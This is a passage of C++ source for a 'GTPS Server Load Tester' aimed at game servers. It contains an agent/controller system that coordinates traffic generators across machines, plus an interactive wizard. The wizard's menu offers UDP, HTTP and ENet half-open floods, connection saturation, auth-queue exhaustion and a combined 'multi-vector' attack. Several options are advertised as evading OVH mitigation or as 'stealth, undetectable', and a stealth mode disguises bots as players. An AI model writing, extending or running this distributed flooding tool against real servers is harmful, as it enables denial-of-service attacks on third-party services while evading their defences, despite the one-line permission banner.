    g_clients_in_world.store(0);
    g_phase.pps.store(run_cfg.pps);
    g_phase.tile_burst_count.store(run_cfg.tile_burst_count);
    g_phase.tile_burst_ms.store(run_cfg.tile_burst_ms);
    g_phase.pattern_idx.store((int)run_cfg.pattern);
    g_phase.crowd_mode.store(run_cfg.crowd_mode);
    g_phase.crowd_stay_ms.store(run_cfg.crowd_stay_ms);
    g_phase.target_clients.store(0);
    g_phase.set_world(run_cfg.world);
    g_phase.set_phase_name("agent_test");
    g_phase.phase_num.store(1);

    int n_threads = std::max(1, run_cfg.threads);
    g_stats.clear();
    for (int i = 0; i < n_threads; i++)
        g_stats.push_back(std::make_unique<ThreadStats>());

    // 5. Launch worker threads
    std::vector<std::thread> workers;
    for (int i = 0; i < n_threads; i++) {
        if (run_cfg.mode == "game") {
            workers.emplace_back(game_adaptive_worker, i, std::cref(run_cfg));
        } else {
            workers.emplace_back(udp_worker, i, std::cref(run_cfg));
        }
    }

    // 6. Stream STAT lines for duration seconds, watch for STOP
    // Set ctrl_fd non-blocking for STOP check
    fcntl(ctrl_fd, F_SETFL, O_NONBLOCK);

    SnapStats prev{};
    int t = 0;
    int64_t test_start = now_ms();
    int64_t next_tick  = test_start + 1000;

    while (g_running.load()) {
        int64_t now2 = now_ms();
        if (now2 >= next_tick) {
            next_tick += 1000;
            t++;

            SnapStats cur = snapshot_stats();
            uint64_t dpkts  = cur.packets_sent  - prev.packets_sent;
            uint64_t dbytes = cur.bytes_sent     - prev.bytes_sent;
            uint64_t derrs  = cur.errors         - prev.errors;
            uint64_t dbursts= cur.tile_bursts    - prev.tile_bursts;
            prev = cur;

            // Merge RTT
            g_global_rtt.reset();
            for (auto& ts2 : g_stats) g_global_rtt.merge_from(ts2->rtt_hist);
            uint64_t p50 = g_global_rtt.percentile(50);
            uint64_t p95 = g_global_rtt.percentile(95);
            uint64_t p99 = g_global_rtt.percentile(99);

            double pps  = (double)dpkts;
            double mbps = dbytes * 8.0 / 1e6;
            int cw      = g_clients_in_world.load();
            int active  = cur.active_clients;
            std::string phase = g_phase.get_phase_name();
            int pnum    = g_phase.phase_num.load();

            std::string stat = "STAT " + build_stat_json(t, pps, mbps,
                p50, p95, p99, active, cw, derrs, dbursts, phase, pnum);
            if (!tcp_send_line(ctrl_fd, stat)) {
                printf("[agent] Controller disconnected mid-test.\n");
                break;
            }

            if (run_cfg.duration > 0 && t >= run_cfg.duration) {
                g_running.store(false);
                break;
            }
        }

        // Non-blocking check for STOP
        char cmd_buf[64];
        ssize_t n = recv(ctrl_fd, cmd_buf, sizeof(cmd_buf) - 1, 0);
        if (n > 0) {
            cmd_buf[n] = 0;
            if (strstr(cmd_buf, "STOP") != nullptr) {
                printf("[agent] Received STOP from controller.\n");
                g_running.store(false);
                break;
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    // 7. Stop workers
    g_running.store(false);
    for (auto& w : workers) if (w.joinable()) w.join();

    tcp_send_line(ctrl_fd, "DONE");
    printf("[agent] Test complete. Sent DONE.\n");
}

static void agent_server(const Config& cfg) {
    int listen_fd = tcp_listen(cfg.agent_port);
    if (listen_fd < 0) {
        fprintf(stderr, "[agent] Cannot bind port %d: %s\n",
            cfg.agent_port, strerror(errno));
        return;
    }
    printf("[agent] Listening on port %d  (secret: %s)\n",
        cfg.agent_port,
        cfg.agent_secret.empty() ? "(none)" : "***");
    printf("[agent] Waiting for controller connection...\n");

    while (true) {
        struct sockaddr_in peer_addr{};
        socklen_t peer_len = sizeof(peer_addr);
        int ctrl_fd = accept(listen_fd, (struct sockaddr*)&peer_addr, &peer_len);
        if (ctrl_fd < 0) {
            if (errno == EINTR) continue;
            fprintf(stderr, "[agent] accept error: %s\n", strerror(errno));
            break;
        }
        char peer_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &peer_addr.sin_addr, peer_ip, sizeof(peer_ip));
        printf("[agent] Connection from %s\n", peer_ip);

        agent_session(ctrl_fd, cfg);
        close(ctrl_fd);

        // Reset global state for next session
        g_running.store(true);
        printf("[agent] Ready for next connection.\n");
    }
    close(listen_fd);
}

// ============================================================================
// v6 FEATURE 6b + 6c — Controller mode + aggregate ncurses dashboard
// ============================================================================

struct AgentInfo {
    std::string   addr;
    std::string   ip;
    int           port  = 0;
    int           fd    = -1;

    // Live stats (written by reader thread, read by display)
    std::atomic<int64_t>  pps         {0};
    std::atomic<int64_t>  kbps        {0};   // *1000 for precision
    std::atomic<int64_t>  rtt_p50     {0};
    std::atomic<int64_t>  rtt_p95     {0};
    std::atomic<int64_t>  rtt_p99     {0};
    std::atomic<int>      active      {0};
    std::atomic<int>      cw          {0};
    std::atomic<int64_t>  errors      {0};
    std::atomic<int>      t_sec       {0};
    std::string           phase;
    std::mutex            phase_mtx;
    std::atomic<bool>     connected   {false};
    std::atomic<bool>     done        {false};
    std::atomic<bool>     error       {false};
    std::string           status_str  = "connecting";
    std::mutex            status_mtx;

    void set_status(const std::string& s) {
        std::lock_guard<std::mutex> lk(status_mtx);
        status_str = s;
    }
    std::string get_status() {
        std::lock_guard<std::mutex> lk(status_mtx);
        return status_str;
    }
    std::string get_phase() {
        std::lock_guard<std::mutex> lk(phase_mtx);
        return phase;
    }
    void set_phase(const std::string& p) {
        std::lock_guard<std::mutex> lk(phase_mtx);
        phase = p;
    }
};

// Aggregate CSV (unified — one row per agent per second)
struct ControllerCSV {
    std::ofstream unified;
    std::ofstream aggregate;

    bool open(const std::string& base) {
        std::string u = base.empty() ? "ctrl_unified.csv"  : base + "_unified.csv";
        std::string a = base.empty() ? "ctrl_aggregate.csv" : base + "_aggregate.csv";
        unified.open(u, std::ios::out | std::ios::trunc);
        aggregate.open(a, std::ios::out | std::ios::trunc);
        if (!unified.is_open() || !aggregate.is_open()) return false;
        unified   << "t,source,pps,mbps,rtt_p50_us,rtt_p95_us,rtt_p99_us,"
                     "active_clients,cw,errors,phase\n";
        aggregate << "t,total_pps,total_mbps,max_rtt_p95_us,avg_rtt_p50_us,"
                     "total_active,total_cw,total_errors,phase\n";
        return true;
    }

    void write_unified(int t, const std::string& source,
                       int64_t pps, double mbps,
                       int64_t p50, int64_t p95, int64_t p99,
                       int active, int cw, int64_t errs, const std::string& phase) {
        if (!unified.is_open()) return;
        unified << t << "," << source << "," << pps << "," << mbps << ","
                << p50 << "," << p95 << "," << p99 << ","
                << active << "," << cw << "," << errs << ","
                << phase << "\n";
        unified.flush();
    }

    void write_aggregate(int t, int64_t tpps, double tmbps,
                         int64_t max_p95, int64_t avg_p50,
                         int tactive, int tcw, int64_t terrs,
                         const std::string& phase) {
        if (!aggregate.is_open()) return;
        aggregate << t << "," << tpps << "," << tmbps << ","
                  << max_p95 << "," << avg_p50 << ","
                  << tactive << "," << tcw << "," << terrs << ","
                  << phase << "\n";
        aggregate.flush();
    }
};

static void controller_run(const Config& cfg) {
    if (cfg.agent_addrs.empty()) {
        fprintf(stderr, "[ctrl] No agents specified. Use --agents ip:port,...\n");
        return;
    }

    printf("[ctrl] Connecting to %zu agent(s)...\n", cfg.agent_addrs.size());

    // Create AgentInfo objects
    std::vector<std::unique_ptr<AgentInfo>> agents;
    for (auto& addr : cfg.agent_addrs) {
        auto a = std::make_unique<AgentInfo>();
        a->addr = addr;
        if (!parse_addr(addr, a->ip, a->port)) {
            fprintf(stderr, "[ctrl] Invalid agent address: %s\n", addr.c_str());
            return;
        }
        agents.push_back(std::move(a));
    }

    // Connect to all agents
    int connected_count = 0;
    for (auto& a : agents) {
        a->fd = tcp_connect(a->ip, a->port);
        if (a->fd < 0) {
            fprintf(stderr, "[ctrl] Cannot connect to %s: %s\n",
                a->addr.c_str(), strerror(errno));
            a->set_status("unreachable");
            a->error.store(true);
        } else {
            a->connected.store(true);
            a->set_status("connected");
            printf("[ctrl] Connected to %s\n", a->addr.c_str());
            connected_count++;
        }
    }

    if (connected_count == 0) {
        fprintf(stderr, "[ctrl] No agents reachable. Aborting.\n");
        return;
    }

    // HELLO handshake
    for (auto& a : agents) {
        if (!a->connected.load()) continue;
        std::string hello = "HELLO";
        if (!cfg.agent_secret.empty()) hello += " " + cfg.agent_secret;
        if (!tcp_send_line(a->fd, hello)) {
            a->set_status("hello_failed");
            a->error.store(true);
            continue;
        }
        std::string reply;
        if (!tcp_readline(a->fd, reply, 5000)) {
            a->set_status("hello_timeout");
            a->error.store(true);
            continue;
        }
        if (reply.substr(0, 2) != "OK") {
            fprintf(stderr, "[ctrl] Agent %s rejected: %s\n",
                a->addr.c_str(), reply.c_str());
            a->set_status("rejected");
            a->error.store(true);
            continue;
        }
        a->set_status("ready");
        printf("[ctrl] Agent %s ready (%s)\n", a->addr.c_str(), reply.c_str());
    }

    // Compute synchronized T₀
    int64_t t0_ms = epoch_ms() + CTRL_T0_LEAD_MS;

    // Send START to all ready agents
    std::string start_json = cfg_to_start_json(cfg, t0_ms);
    std::string start_line = "START " + start_json;
    for (auto& a : agents) {
        if (a->error.load()) continue;
        if (!tcp_send_line(a->fd, start_line)) {
            a->set_status("start_failed");
            a->error.store(true);
        } else {
            a->set_status("starting");
        }
    }

    // Wait for READY from each agent
    for (auto& a : agents) {
        if (a->error.load()) continue;
        std::string reply;
        if (!tcp_readline(a->fd, reply, (int)(CTRL_T0_LEAD_MS + 2000))) {
            a->set_status("ready_timeout");
            a->error.store(true);
        } else if (reply != "READY") {
            fprintf(stderr, "[ctrl] Agent %s unexpected reply to START: %s\n",
                a->addr.c_str(), reply.c_str());
            a->set_status("start_error");
            a->error.store(true);
        } else {
            a->set_status("running");
            printf("[ctrl] Agent %s started.\n", a->addr.c_str());
        }
    }

    printf("[ctrl] All agents started. T₀ = %lld ms.\n", (long long)t0_ms);
    printf("[ctrl] Collecting stats for %d seconds...\n", cfg.duration);

    // Open CSV files
    ControllerCSV csv;
    std::string csv_base = cfg.csv_file;
    if (!csv_base.empty()) {
        // Strip extension if any
        auto dot = csv_base.rfind('.');
        if (dot != std::string::npos) csv_base = csv_base.substr(0, dot);
        csv.open(csv_base);
    }

    // Spawn per-agent STAT reader threads
    std::atomic<bool> ctrl_running {true};
    std::vector<std::thread> readers;

    for (auto& a_ptr : agents) {
        AgentInfo* a = a_ptr.get();
        if (a->error.load()) continue;
        readers.emplace_back([a, &ctrl_running]() {
            std::string line;
            while (ctrl_running.load() && !a->done.load()) {
                // poll() with 1s timeout — avoids undefined recv(nullptr,0,MSG_PEEK)
                struct pollfd pfd { a->fd, POLLIN, 0 };
                int pr = poll(&pfd, 1, 1000);
                if (pr <= 0) continue;  // timeout or signal, loop and recheck ctrl_running
                if (!tcp_readline(a->fd, line, 2000)) {
                    if (ctrl_running.load()) {
                        a->set_status("disconnected");
                        a->error.store(true);
                    }
                    break;
                }
                if (line.substr(0, 5) == "STAT ") {
                    std::string j = line.substr(5);
                    a->pps.store(json_i64(j, "pps",  0));
                    a->kbps.store((int64_t)(json_raw(j, "mbps").empty() ? 0
                        : (int64_t)(std::stod(json_raw(j, "mbps")) * 1000.0)));
                    a->rtt_p50.store(json_i64(j, "rtt_p50", 0));
                    a->rtt_p95.store(json_i64(j, "rtt_p95", 0));
                    a->rtt_p99.store(json_i64(j, "rtt_p99", 0));
                    a->active.store(json_int(j, "active", 0));
                    a->cw.store(json_int(j, "cw", 0));
                    a->errors.store(json_i64(j, "errors", 0));
                    a->t_sec.store(json_int(j, "t", 0));
                    a->set_phase(json_str(j, "phase", ""));
                    a->set_status("running");
                } else if (line == "DONE") {
                    a->set_status("done");
                    a->done.store(true);
                    break;
                } else if (line.substr(0, 3) == "ERR") {
                    fprintf(stderr, "[ctrl] Agent %s error: %s\n",
                        a->addr.c_str(), line.c_str());
                    a->set_status("error");
                    a->error.store(true);
                    break;
                }
            }
        });
    }

#ifdef USE_NCURSES
    WINDOW* cwin = nullptr;
    if (cfg.dashboard) {
        cwin = initscr();
        cbreak(); noecho(); curs_set(0);
        start_color();
        init_pair(1, COLOR_GREEN,  COLOR_BLACK);
        init_pair(2, COLOR_YELLOW, COLOR_BLACK);
        init_pair(3, COLOR_RED,    COLOR_BLACK);
        init_pair(4, COLOR_CYAN,   COLOR_BLACK);
        init_pair(5, COLOR_WHITE,  COLOR_BLUE);
    }
#endif

    // Aggregation + display loop
    int t = 0;

    while (ctrl_running.load()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        t++;

        // Aggregate across agents
        int64_t total_pps    = 0;
        double  total_mbps   = 0.0;
        int64_t max_p95      = 0;
        int64_t sum_p50      = 0;
        int64_t p50_count    = 0;
        int     total_active = 0;
        int     total_cw     = 0;
        int64_t total_errs   = 0;
        std::string agg_phase;

        for (auto& a : agents) {
            if (a->error.load() && !a->done.load()) continue;
            int64_t apps = a->pps.load();
            total_pps    += apps;
            total_mbps   += (double)a->kbps.load() / 1000.0;
            int64_t ap95  = a->rtt_p95.load();
            if (ap95 > max_p95) max_p95 = ap95;
            int64_t ap50  = a->rtt_p50.load();
            if (ap50 > 0) { sum_p50 += ap50; p50_count++; }
            total_active += a->active.load();
            total_cw     += a->cw.load();
            total_errs   += a->errors.load();
            if (agg_phase.empty()) agg_phase = a->get_phase();
        }
        int64_t avg_p50 = (p50_count > 0) ? sum_p50 / p50_count : 0;

        // Write unified CSV (per-agent rows)
        for (auto& a : agents) {
            if (!csv_base.empty()) {
                csv.write_unified(t, a->addr,
                    a->pps.load(), (double)a->kbps.load() / 1000.0,
                    a->rtt_p50.load(), a->rtt_p95.load(), a->rtt_p99.load(),
                    a->active.load(), a->cw.load(), a->errors.load(),
                    a->get_phase());
            }
        }

        // Write aggregate CSV
        if (!csv_base.empty())
            csv.write_aggregate(t, total_pps, total_mbps, max_p95, avg_p50,
                total_active, total_cw, total_errs, agg_phase);

#ifdef USE_NCURSES
        if (cfg.dashboard && cwin) {
            werase(cwin);
            int row = 0;
            wattron(cwin, COLOR_PAIR(4) | A_BOLD);
            mvwprintw(cwin, row++, 0,
                "GTPS Load Tester %s — CONTROLLER — %zu agents — t=%ds",
                GTPS_SLT_VERSION, agents.size(), t);
            wattroff(cwin, COLOR_PAIR(4) | A_BOLD);
            row++;

            // Header row
            wattron(cwin, A_BOLD);
            mvwprintw(cwin, row++, 0,
                "%-20s %-12s %8s %8s %10s %8s %8s %s",
                "Agent", "Status", "PPS", "Mbps", "RTT p95ms", "Active", "CW", "Phase");
            wattroff(cwin, A_BOLD);

            for (auto& a : agents) {
                std::string status = a->get_status();
                int cpair = (status == "running") ? 1
                          : (status == "done")    ? 4
                          : 3;
                wattron(cwin, COLOR_PAIR(cpair));
                double mbps_a = (double)a->kbps.load() / 1000.0;
                double p95_ms = a->rtt_p95.load() / 1000.0;
                mvwprintw(cwin, row++, 0,
                    "%-20s %-12s %8lld %8.2f %10.2f %8d %8d %s",
                    a->addr.c_str(), status.c_str(),
                    (long long)a->pps.load(), mbps_a, p95_ms,
                    a->active.load(), a->cw.load(),
                    a->get_phase().c_str());
                wattroff(cwin, COLOR_PAIR(cpair));
            }

            // Separator
            row++;
            wattron(cwin, A_BOLD | COLOR_PAIR(5));
            double max_p95_ms = max_p95 / 1000.0;
            mvwprintw(cwin, row++, 0,
                "%-20s %-12s %8lld %8.2f %10.2f %8d %8d %s",
                "AGGREGATE", "",
                (long long)total_pps, total_mbps, max_p95_ms,
                total_active, total_cw, agg_phase.c_str());
            wattroff(cwin, A_BOLD | COLOR_PAIR(5));
            row++;

            // Avg p50
            mvwprintw(cwin, row++, 0, "Avg RTT p50: %.2f ms   Max RTT p95: %.2f ms",
                avg_p50 / 1000.0, max_p95 / 1000.0);

            // Duration progress bar
            if (cfg.duration > 0) {
                int bar_w = 40;
                int filled = (int)((double)t / cfg.duration * bar_w);
                if (filled > bar_w) filled = bar_w;
                std::string bar = "[";
                bar += std::string(filled, '=');
                bar += std::string(bar_w - filled, ' ');
                bar += "] " + std::to_string(t) + "/" + std::to_string(cfg.duration) + "s";
                mvwprintw(cwin, row++, 0, "%s", bar.c_str());
            }

            wrefresh(cwin);
        } else
#endif
        {
            // Console table output
            printf("\n[ctrl t=%d]\n", t);
            printf("  %-22s %-12s %7s %6s %9s %7s %7s  %s\n",
                "Agent", "Status", "PPS", "Mbps", "p95(ms)", "Active", "CW", "Phase");
            for (auto& a : agents) {
                double mbps_a = (double)a->kbps.load() / 1000.0;
                printf("  %-22s %-12s %7lld %6.2f %9.2f %7d %7d  %s\n",
                    a->addr.c_str(), a->get_status().c_str(),
                    (long long)a->pps.load(), mbps_a,
                    a->rtt_p95.load() / 1000.0,
                    a->active.load(), a->cw.load(),
                    a->get_phase().c_str());
            }
            printf("  %-22s %-12s %7lld %6.2f %9.2f %7d %7d  %s\n",
                "AGGREGATE", "",
                (long long)total_pps, total_mbps,
                max_p95 / 1000.0, total_active, total_cw, agg_phase.c_str());
            fflush(stdout);
        }

        // Check termination conditions
        bool all_done = true;
        for (auto& a : agents) {
            if (!a->done.load() && !a->error.load()) { all_done = false; break; }
        }
        if (all_done) {
            printf("[ctrl] All agents done.\n");
            break;
        }
        if (cfg.duration > 0 && t >= cfg.duration) {
            printf("[ctrl] Duration reached. Sending STOP.\n");
            for (auto& a : agents) {
                if (!a->error.load()) tcp_send_line(a->fd, "STOP");
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
            break;
        }
    }

    ctrl_running.store(false);
    for (auto& r : readers) if (r.joinable()) r.join();

#ifdef USE_NCURSES
    if (cfg.dashboard) endwin();
#endif

    // Cleanup sockets
    for (auto& a : agents) {
        if (a->fd >= 0) close(a->fd);
    }

    // Final summary
    printf("\n=== CONTROLLER SUMMARY ===\n");
    for (auto& a : agents) {
        printf("  Agent %s: status=%s t=%ds\n",
            a->addr.c_str(), a->get_status().c_str(), a->t_sec.load());
    }
    if (!csv_base.empty()) {
        printf("  CSV written: %s_unified.csv + %s_aggregate.csv\n",
            csv_base.c_str(), csv_base.c_str());
    }
    printf("==========================\n");
}

// ============================================================================
// SIGINT handler
// ============================================================================

static void sigint_handler(int) {
    g_running.store(false);
    printf("\n[slt] Interrupted. Stopping...\n");
}

// ============================================================================
// main()
// ============================================================================

// ============================================================================
// v7.2: Interactive Wizard — menu-driven configuration
//
// Jalankan tanpa argument: ./slt → masuk wizard interaktif
// Atau: ./slt --interactive
// ============================================================================

static std::string ask(const std::string& prompt, const std::string& default_val = "") {
    if (!default_val.empty())
        printf("  %s [%s]: ", prompt.c_str(), default_val.c_str());
    else
        printf("  %s: ", prompt.c_str());
    fflush(stdout);
    std::string line;
    std::getline(std::cin, line);
    if (line.empty()) return default_val;
    return line;
}

static int ask_int(const std::string& prompt, int default_val) {
    std::string s = ask(prompt, std::to_string(default_val));
    try { return std::stoi(s); } catch (...) { return default_val; }
}

static Config interactive_wizard() {
    Config cfg;

    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║      GTPS Server Load Tester %s              ║\n", GTPS_SLT_VERSION);
    printf("║      Interactive Mode                            ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("\n");

    // Step 1: Select mode
    printf("┌─ Step 1: Select Mode ─────────────────────────────\n");
    printf("│\n");
    printf("│  [1] 🎮 Player Simulation     — simulate real players\n");
    printf("│  [2] ⚡ Attack / Resilience    — DDoS resilience testing\n");
    printf("│  [3] 👁  Canary Monitor        — monitor RTT during test\n");
    printf("│  [4] 📡 UDP Flood             — raw UDP (OVH VAC test)\n");
    printf("│  [5] 🌐 HTTP Flood            — non-ENet HTTP method\n");
    printf("│  [6] 📊 Threshold Detect      — auto-find server limit\n");
    printf("│  [7] 🔗 Agent Mode            — wait for controller\n");
    printf("│  [8] 🎛  Controller Mode       — coordinate agents\n");
    printf("│  [9] 🔍 Recon                 — quick multi-vector scan (recommended)\n");
    printf("│\n");

    int mode_choice = ask_int("Select mode (1-9)", 9);

    switch (mode_choice) {
    case 1: cfg.mode = "game"; break;
    case 2: cfg.mode = "attack"; break;
    case 3: cfg.mode = "canary"; break;
    case 4: cfg.mode = "udp"; break;
    case 5: cfg.mode = "attack"; cfg.attack_type = "http"; break;
    case 6: cfg.mode = "attack"; cfg.attack_type = "threshold"; break;
    case 7: cfg.mode = "agent"; break;
    case 8: cfg.mode = "controller"; break;
    case 9: cfg.mode = "attack"; cfg.attack_type = "orchestrator"; break;
    default: cfg.mode = "attack"; cfg.attack_type = "orchestrator"; break;
    }

    // Step 2: Target
    if (cfg.mode != "agent") {
        printf("\n┌─ Step 2: Target ──────────────────────────────────\n");
        printf("│\n");
        cfg.target = ask("Target IP", "127.0.0.1");
        cfg.port = ask_int("Port", DEFAULT_PORT);
    }

    // Step 3: Attack type (if attack mode)
    if (cfg.mode == "attack" && cfg.attack_type.empty()) {
        printf("\n┌─ Step 3: Attack / Recon Method ──────────────────\n");
        printf("│\n");
        printf("│  100%% Lolos OVH (valid game traffic):\n");
        printf("│  [1] 🔌 Multi-Peer (M-PEER)   — connection saturation  ⭐ RECOMMENDED\n");
        printf("│  [2] 🐌 Slow Accumulate        — stealth, undetectable\n");
        printf("│  [3] 🔑 Login Ghost (M-AUTH)   — auth queue exhaustion\n");
        printf("│  [4] 🔄 World Churn (M-CPU)    — CPU stress via world loading\n");
        printf("│  [5] 📢 Broadcast Amp (M-FLOOD) — outbound bandwidth stress\n");
        printf("│  [6] 🎯 Multi-Vector           — ALL methods combined  ⭐⭐ MODERN\n");
        printf("│\n");
        printf("│  Mungkin diblok OVH:\n");
        printf("│  [7] 🔨 ENet Halfopen (M1)     — raw ENet CONNECT flood\n");
        printf("│\n");

        int atk = ask_int("Select method (1-7)", 6);
        switch (atk) {
        case 1: cfg.attack_type = "multi-peer"; break;
        case 2: cfg.attack_type = "slow"; break;
        case 3: cfg.attack_type = "login-ghost"; break;
        case 4: cfg.attack_type = "world-churn"; break;
        case 5: cfg.attack_type = "broadcast-amp"; break;
        case 6: cfg.attack_type = "orchestrator"; break;
        case 7: cfg.attack_type = "enet-halfopen"; break;
        default: cfg.attack_type = "orchestrator"; break;
        }
    }

    // Step 4: Parameters
    printf("\n┌─ Step 4: Parameters ──────────────────────────────\n");
    printf("│\n");

    if (cfg.mode == "attack") {
        if (cfg.attack_type == "enet-halfopen") {
            cfg.pps = ask_int("Packets/sec", 3000);
            cfg.threads = ask_int("Threads", 2);
        } else if (cfg.attack_type == "http") {
            cfg.http_target = ask("HTTP target URL", "http://" + cfg.target + "/");
            cfg.http_rps = ask_int("Requests/sec per thread", 50);
            cfg.threads = ask_int("Threads", 4);
        } else if (cfg.attack_type == "slow") {
            cfg.peers_per_thread = ask_int("Max connections", 200);
            cfg.slow_interval_ms = ask_int("New connection interval (ms)", 8000);
            cfg.threads = 2;
        } else if (cfg.attack_type == "threshold") {
            cfg.peers_per_thread = ask_int("Max connections to test", 500);
            cfg.threads = 1;
        } else if (cfg.attack_type == "orchestrator" || cfg.attack_type == "multi-vector") {
            int total = ask_int("Total connections", 200);
            cfg.peers_per_thread = ask_int("Peers per thread", 50);
            cfg.threads = std::max(1, total / cfg.peers_per_thread);
            cfg.ramp_sec = ask_int("Ramp-up time (seconds)", 30);
            printf("│\n│  Role allocation (must total ~100%%):\n");
            printf("│  Default: ghost:40, churn:30, amp:20, player:10\n");
            cfg.scenario_roles = ask("Roles (ghost:N,churn:N,amp:N,player:N)",
                                     "ghost:40,churn:30,amp:20,player:10");
            std::string rot = ask("Rotate roles every N seconds (0=off)", "0");
            cfg.rotate_sec = std::stoi(rot);
            std::string scn = ask("Scenario INI file (empty=none)", "");
            cfg.mv_scenario_file = scn;
            std::string adp = ask("Enable adaptive auto-adjustment? (y/n)", "y");
            if (adp == "y" || adp == "Y") cfg.adaptive = true;
            cfg.world = ask("Primary world", "START");
            std::string wl = ask("World list for churn (comma-separated)", "START,NUBFARM,EXIT");
            std::istringstream wss(wl);
            std::string w;
            while (std::getline(wss, w, ','))
                if (!w.empty()) cfg.world_list.push_back(w);
        } else {
            // multi-peer, ghost, login-ghost, world-churn, broadcast-amp
            int total = ask_int("Total connections", 200);
            cfg.peers_per_thread = ask_int("Peers per thread", 50);
            cfg.threads = std::max(1, total / cfg.peers_per_thread);
            printf("│  → %d threads × %d peers = %d connections\n",
                   cfg.threads, cfg.peers_per_thread, cfg.threads * cfg.peers_per_thread);
        }

        if (cfg.attack_type == "world-churn") {
            cfg.churn_stay_ms = ask_int("Stay time per world (ms)", 500);
            std::string wl = ask("World list (comma-separated)", "START");
            std::istringstream ss(wl);
            std::string w;
            while (std::getline(ss, w, ','))
                if (!w.empty()) cfg.world_list.push_back(w);
        }

        if (cfg.attack_type == "broadcast-amp" || cfg.attack_type == "multi-peer" ||
            cfg.attack_type == "ghost" || cfg.attack_type == "login-ghost") {
            cfg.world = ask("World to join", "START");
        }

        cfg.duration = ask_int("Duration (seconds)", 60);

    } else if (cfg.mode == "game") {
        cfg.clients = ask_int("Simulated players", 50);
        cfg.threads = ask_int("Threads", DEFAULT_THREADS);
        cfg.duration = ask_int("Duration (seconds)", 120);
        cfg.world = ask("World", "START");

    } else if (cfg.mode == "canary") {
        cfg.canary_world = ask("World to monitor", "START");
        cfg.duration = ask_int("Duration (seconds)", 120);

    } else if (cfg.mode == "udp") {
        cfg.pps = ask_int("Packets/sec", 20000);
        cfg.threads = ask_int("Threads", 4);
        cfg.duration = ask_int("Duration (seconds)", 60);
        printf("│\n│  UDP size: [1] fixed  [2] min  [3] max  [4] mixed  [5] enet\n");
        int us = ask_int("Select", 1);
        const char* sizes[] = {"fixed", "min", "max", "mixed", "enet"};
        cfg.udp_size = sizes[std::min(4, std::max(0, us-1))];

    } else if (cfg.mode == "agent") {
        cfg.agent_port = ask_int("Agent listen port", DEFAULT_AGENT_PORT);
    }

    // Step 5: Stealth & extras
    if (cfg.mode == "attack") {
        printf("\n┌─ Step 5: Options ─────────────────────────────────\n");
        printf("│\n");
        std::string stealth = ask("Enable stealth mode? (y/n)", "y");
        if (stealth == "y" || stealth == "Y" || stealth == "yes") {
            cfg.stealth = true;
            cfg.mimic_player = true;
            cfg.randomize_names = true;
            cfg.jitter_ms = 50;
            if (cfg.connect_rate == 0) cfg.connect_rate = 80;
        }

        int cooldown = ask_int("Cooldown/recovery measurement (seconds, 0=off)", 30);
        cfg.cooldown_sec = cooldown;

        std::string csv = ask("CSV output filename", "test_" + cfg.attack_type + ".csv");
        cfg.csv_file = csv;
    } else {
        std::string csv = ask("CSV output filename (empty=none)", "");
        cfg.csv_file = csv;
    }

    // Summary
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║  READY TO START                                  ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║  Mode:     %-38s║\n", cfg.mode.c_str());
    if (!cfg.attack_type.empty())
    printf("║  Attack:   %-38s║\n", cfg.attack_type.c_str());
    printf("║  Target:   %-38s║\n", (cfg.target + ":" + std::to_string(cfg.port)).c_str());
    if (cfg.mode == "attack" && cfg.attack_type != "enet-halfopen" && cfg.attack_type != "http")
    printf("║  Conns:    %-38s║\n",
        (std::to_string(cfg.threads) + " threads × " +
         std::to_string(cfg.peers_per_thread) + " peers = " +
         std::to_string(cfg.threads * cfg.peers_per_thread)).c_str());
    printf("║  Duration: %-38s║\n", (std::to_string(cfg.duration) + "s").c_str());
    printf("║  Stealth:  %-38s║\n", cfg.stealth ? "ON" : "OFF");
    if (!cfg.csv_file.empty())
    printf("║  CSV:      %-38s║\n", cfg.csv_file.c_str());
    printf("╚══════════════════════════════════════════════════╝\n");

    std::string go = ask("\nStart? (y/n)", "y");
    if (go != "y" && go != "Y" && go != "yes") {
        printf("Cancelled.\n");
        exit(0);
    }

    printf("\n");

    // Apply stealth defaults if enabled
    if (cfg.stealth) {
        if (cfg.connect_rate == 0) cfg.connect_rate = 80;
        if (cfg.jitter_ms == 0) cfg.jitter_ms = 50;
        cfg.mimic_player = true;
        cfg.randomize_names = true;
    }

    // Default tp values
    cfg.tp.constant_pps = cfg.pps;
    cfg.tp.sin_base_pps = cfg.pps;
    cfg.tp.rw_start_pps = cfg.pps;
    if (cfg.attack_type == "login-ghost") cfg.ghost_after = "login";

    return cfg;
}

int main(int argc, char** argv) {
    // v7.2: Interactive wizard when no arguments given
    bool interactive = (argc == 1);
    for (int i = 1; i < argc; i++)
        if (std::string(argv[i]) == "--interactive" || std::string(argv[i]) == "-i")
            interactive = true;

    Config cfg;
    if (interactive)
        cfg = interactive_wizard();
    else
        cfg = parse_args(argc, argv);

    signal(SIGINT,  sigint_handler);
    signal(SIGTERM, sigint_handler);
    signal(SIGPIPE, SIG_IGN);

    // Normalize mode aliases
    if (cfg.mode == "recon")           { cfg.mode = "attack"; if (cfg.attack_type.empty()) cfg.attack_type = "orchestrator"; }
    if (cfg.mode == "stress")          { cfg.mode = "attack"; if (cfg.attack_type.empty()) cfg.attack_type = "orchestrator"; }
    if (cfg.mode == "flood")           { cfg.mode = "attack"; if (cfg.attack_type.empty()) cfg.attack_type = "ghost"; }
    if (cfg.attack_type == "login-ghost") cfg.ghost_after = "login";

    if (!interactive) {
        printf("GTPS Server Load Tester %s\n", GTPS_SLT_VERSION);
        printf("*** FOR USE ON YOUR OWN SERVER OR WITH EXPLICIT PERMISSION ***\n\n");
    }

    // -----------------------------------------------------------------------
    // Agent mode: just run the agent server (blocking)
    // -----------------------------------------------------------------------
    if (cfg.mode == "agent") {
        printf("[mode] agent  port=%d\n", cfg.agent_port);
        if (enet_initialize() != 0) {
            fprintf(stderr, "ENet init failed.\n"); return 1;
        }
        agent_server(cfg);
        enet_deinitialize();
        return 0;
    }

    // -----------------------------------------------------------------------
    // Controller mode: coordinate agents
    // -----------------------------------------------------------------------
    if (cfg.mode == "controller") {
        printf("[mode] controller  agents=%zu  duration=%ds\n",
            cfg.agent_addrs.size(), cfg.duration);
        controller_run(cfg);
        return 0;
    }

